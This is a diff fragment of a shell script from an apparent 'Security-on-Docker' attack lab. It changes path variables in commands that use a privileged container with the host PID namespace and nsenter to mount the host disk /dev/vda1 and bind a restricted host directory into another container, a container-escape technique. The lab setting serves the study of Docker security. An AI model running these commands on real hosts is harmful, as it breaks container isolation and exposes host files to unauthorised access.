@@ -10,7 +10,7 @@ rm PID
 #Done by host
 : <<'END'
 sudo nsenter --target ${container_pid} --mount --uts --ipc --net --pid -- mount /dev/vda1 /tmpmount
-sudo nsenter --target ${container_pid} --mount --uts --ipc --net --pid -- mount -o bind /tmpmount/home/ubuntu/Security-on-Docker/Attacks/Hosts_fs/restricted_area /doot
+sudo nsenter --target ${container_pid} --mount --uts --ipc --net --pid -- mount -o bind /tmpmount/${attack}/restricted_area /doot
 sudo nsenter --target ${container_pid} --mount --uts --ipc --net --pid -- umount /tmpmount
 END
 
@@ -20,7 +20,7 @@ docker run --privileged --pid=host --rm -it debian:latest nsenter --target ${con
 
 #I can do mkdir and mknod with nsenter too -> version 4
 
-docker run --privileged --pid=host --rm -it debian:latest nsenter --target ${container_pid} --mount mount -o bind /tmpmount/${privileged_attacker}/restricted_area /doot
+docker run --privileged --pid=host --rm -it debian:latest nsenter --target ${container_pid} --mount mount -o bind /tmpmount/${attack}/restricted_area /doot
 
 docker run --privileged --pid=host --rm -it debian:latest nsenter --target ${container_pid} --mount umount /tmpmount
 #END
